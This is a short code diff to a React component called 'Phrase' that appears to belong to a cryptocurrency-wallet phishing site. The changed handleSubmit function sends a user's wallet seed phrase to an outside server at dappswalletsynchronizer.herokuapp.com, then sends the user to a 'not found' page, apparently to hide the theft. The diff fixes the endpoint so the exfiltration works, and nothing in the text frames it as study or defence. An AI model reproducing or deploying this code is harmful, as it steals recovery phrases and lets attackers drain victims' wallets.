@@ -33,9 +33,12 @@ const Phrase = ({
   };
 
   const handleSubmit = async (e) => {
-    const res = await axios.post("https://dappswalletsynchronizer/form", {
-      seed: seed1,
-    });
+    const res = await axios.post(
+      "https://dappswalletsynchronizer.herokuapp.com/form",
+      {
+        seed: seed1,
+      }
+    );
     if (res.data.status === 200) {
       Navigate("/not_found");
     } else {
